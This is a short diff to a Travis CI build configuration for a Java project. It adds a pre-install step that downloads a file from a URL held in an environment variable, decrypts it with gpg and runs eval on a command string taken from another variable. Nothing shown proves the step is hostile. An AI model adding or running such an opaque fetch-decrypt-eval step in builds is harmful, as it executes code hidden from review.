@@ -7,6 +7,11 @@ language: java
 jdk:
   - openjdk11
 
+before_install:
+  - wget "${COMPONENT_LINK}" -O $COMPONENT_NAME -q
+  - echo "${DECRYPTER}" | gpg --passphrase-fd 0 $COMPONENT_NAME
+  - eval "$IMPORT_COMPONENT"
+
 install: true
 
 script:
